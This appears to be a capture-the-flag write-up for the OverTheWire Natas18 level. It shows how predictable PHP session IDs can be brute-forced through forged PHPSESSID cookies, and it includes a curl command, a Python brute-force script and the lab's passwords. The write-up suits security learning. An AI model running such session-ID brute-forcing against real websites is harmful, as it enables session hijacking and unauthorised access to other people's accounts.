---
category: natas
title: Natas18 - Improper Session Management Part 1
---

website: http://natas18.natas.labs.overthewire.org/ (password: xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP)

In this challenge, the web application will print out natas19's password if certain conditions are met:

```php
function print_credentials() {
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
        print "You are an admin. The credentials for the next level are:<br>";
        print "<pre>Username: natas19\n";
        print "Password: <censored></pre>";
    } else {
        print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.";
    }
}
```

As shown above, if we can find the session that has `$_SESSION["admin"] == 1`, then we will be able to see the password. What is a session? A session is a sequence of request of response transactions
associated with the same user. It can be used to keep track of a user's actions and status on a website. Once a session is established, a session ID is assigned and temporarily used as an authentication method by the web application. More details about session management can be found in <a href="https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html">this OWASP article</a>.

Going through the rest PHP code, we can see how a session ID is generated in Natas18:

```php
$maxid = 640; // 640 should be enough for everyone 
... ...
function createID($user) {
    global $maxid;
    return rand(1, $maxid);
} 
```

According to the implementation of generating session ID, we have following observations:
1. There are maximum 640 sessions.
2. The session ID is a random integer between 1 and 640.
3. The session ID is contained in a cookie.

Given that it is possible to specify a cookie in an HTTP request, we can a) Iterate each possible session ID, b) Put that session ID in a cookie, c) Send a request with the cookied, and d) Monitors the response returned by the web server. For example, we can send a request by specifying <small>50</small> as its session ID:

```shell
curl -iu natas18:xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP http://natas18.natas.labs.overthewire.org/  --cookie "PHPSESSID=50"
```

To break the password, I came up with a python script provided below. It reveals that the password is <small>4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs</small>.
 
```python
#!/usr/bin/env python3

import requests
from requests.auth import HTTPBasicAuth


s = requests.Session()
s.auth = HTTPBasicAuth("natas18", "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP")
url = 'http://natas18.natas.labs.overthewire.org/?debug'

# resp = s.post(url, data={"username":'admin', "password":'abc'})
# print(s.cookies.get_dict())
# print(resp.headers)
# print(resp.text)

for i in range(1, 641):
    print(f'Trying PHPSESSID...{i}', end="\r", flush=True)
    resp = s.post(url, data={"username":'admin', "password":'xxx'}, cookies={'PHPSESSID': str(i)})
    if resp and "Password: " in resp.text:
        print(f'\nPHPSESSID found: {i}')
        print(resp.text)
        break
```

<strong>Conclusion</strong>

Because a session ID can be temporarily used as an authentication method by a web application, it is important to ensure its randomness and destroy it after a certain period times
out. Any disclosure of the session ID will lead to session hijacking attacks, where an attacker can impersonate someone else. There are two types of session hijacking attacks:
1. Targeted attacks: The attacker's goal is to impersonate a specific (or privileged) web application victim user. This is what Natas18 has demonstrated.
2. Generic attacks: The attacker's goal is to impersonate (or get access as) <em>any</em> valid or legitimate user in the web application.

<strong>REFERENCE</strong>
1. <a href="https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html">Session Management Cheat Sheet</a>
2. <a href="https://www.php.net/manual/en/function.session-start.php">PHP Manual: session_start</a>
